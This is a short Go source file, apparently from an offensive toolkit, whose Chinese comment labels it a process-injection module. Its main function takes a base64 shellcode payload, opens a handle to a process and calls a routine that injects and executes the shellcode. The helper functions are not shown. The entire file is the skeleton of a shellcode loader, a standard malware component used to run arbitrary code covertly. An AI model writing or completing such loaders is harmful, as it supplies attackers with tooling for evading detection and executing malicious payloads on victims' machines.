package main

/*
* @Author: A
* @Date:   2021/7/12 11:23
  进程注入模块功能
 */
var payload string
func main() {
	// enter shellcode here in 0x00 format
	b64body := payload
	dwProcessId := Getpid()
	pHandle := GetOpenProcess(dwProcessId)
	shellCodeHex := GetShellCode(b64body)
	injectProcessAndEx(pHandle, shellCodeHex)
}